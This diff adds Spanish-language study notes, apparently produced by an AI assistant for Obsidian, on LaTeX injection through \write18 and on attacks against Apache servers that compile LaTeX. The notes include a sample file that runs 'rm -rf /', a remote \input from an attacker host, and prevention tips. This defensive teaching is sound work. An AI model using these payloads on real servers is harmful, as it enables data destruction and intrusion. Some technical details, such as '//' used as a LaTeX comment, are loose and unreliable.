@@ -92,10 +92,95 @@ sequenceDiagram
     Servidor->>Atacante: Devuelve el documento manipulado
 ```
 
+
+## **Inyección LaTeX: `\write18` y Explotación en Servidores Apache**
+
+### **¿Qué es `\write18`?**
+
+`\write18` es una funcionalidad de LaTeX que permite **ejecutar comandos del sistema operativo** durante la compilación de un documento. Esto puede ser extremadamente peligroso si un atacante logra inyectar código malicioso en un documento LaTeX.
+
+
+### **¿Cómo funciona `\write18`?**
+
+1. **Habilitación**:  
+   Para que `\write18` funcione, el compilador LaTeX (como `pdflatex`) debe estar configurado en modo **no seguro** (es decir, con `--shell-escape` habilitado).
+
+2. **Uso**:  
+   El comando `\write18` ejecuta un comando del sistema directamente desde LaTeX. Por ejemplo:
+   ```latex
+   \write18{ls -la}
+   ```
+   Esto listaría los archivos en el directorio actual durante la compilación.
+
+---
+
+### **Ejemplo de Ataque con `\write18`**
+
+- **Escenario**: Un servidor web permite a los usuarios subir archivos LaTeX para generar PDFs.
+- **Ataque**: El atacante sube un archivo LaTeX con el siguiente contenido:
+  ```latex
+  \documentclass{article}
+  \begin{document}
+  \write18{rm -rf /}  // ¡Peligro! Esto borraría todo en el servidor.
+  \end{document}
+  ```
+  - Si el servidor compila el archivo con `--shell-escape`, el comando `rm -rf /` se ejecutará, borrando archivos en el servidor.
+
+---
+
+### **Otras Formas de Burlar un Servidor Apache**
+
+Además de `\write18`, hay otras técnicas que un atacante podría usar para explotar un servidor Apache que permita la compilación de LaTeX:
+
+#### 1. **Inyección de Comandos en Archivos de Configuración**
+   - Si el servidor Apache permite la carga de archivos de configuración personalizados, un atacante podría inyectar comandos maliciosos en estos archivos.
+   - Ejemplo: Inyectar un comando en `.htaccess` para redirigir tráfico o ejecutar scripts.
+
+#### 2. **Explotación de Permisos de Archivos**
+   - Si el servidor Apache tiene permisos demasiado abiertos, un atacante podría modificar archivos críticos o subir scripts maliciosos.
+   - Ejemplo: Subir un script PHP malicioso y ejecutarlo a través de una solicitud HTTP.
+
+#### 3. **Ataques de Inclusión de Archivos**
+   - Si el servidor permite la inclusión de archivos externos, un atacante podría incluir archivos maliciosos desde una URL remota.
+   - Ejemplo: Inyectar `\input{http://atacante.com/malicioso.tex}` en un archivo LaTeX.
+
+#### 4. **Uso de Expresiones Regulares Peligrosas**
+   - Si el servidor usa expresiones regulares inseguras para validar entradas, un atacante podría inyectar código malicioso.
+   - Ejemplo: Usar `\catcode` para cambiar el comportamiento de caracteres especiales en LaTeX.
+
+### **Resumen**
+
+- **`\write18`**: Permite ejecutar comandos del sistema durante la compilación de LaTeX. Es peligroso si no se configura correctamente.
+- **Otras técnicas**: Inyección de comandos en archivos de configuración, explotación de permisos, inclusión de archivos remotos.
+- **Prevención**: Deshabilitar `\write18`, validar entradas, limitar permisos y usar sandboxing.
+
+---
+
+### **Diagrama de Ataque con `\write18`**
+
+```mermaid
+sequenceDiagram
+    participant Atacante
+    participant Servidor
+    participant CompiladorLaTeX
+
+    Atacante->>Servidor: Sube archivo LaTeX malicioso
+    Servidor->>CompiladorLaTeX: Compila el archivo con --shell-escape
+    CompiladorLaTeX->>Servidor: Ejecuta comandos maliciosos
+    Servidor->>Atacante: Resultado de los comandos ejecutados
+```
+
 ---
 
 ### **Consejo Final**
 
-Nunca confíes en las entradas del usuario. Siempre valida y sanitiza los datos antes de usarlos en la generación de documentos.
+Nunca confíes en las entradas del usuario. Siempre valida y sanitiza los datos antes de procesarlos, y asegúrate de que el entorno de compilación esté bien configurado y aislado.
+
+---
+
+¡Y eso es todo! Un apunte hermoso, claro y fácil de entender para tu Obsidian. 😊 Si necesitas más detalles o ajustes, no dudes en pedírmelo.
+
+
+
 
 [[OWASP]]
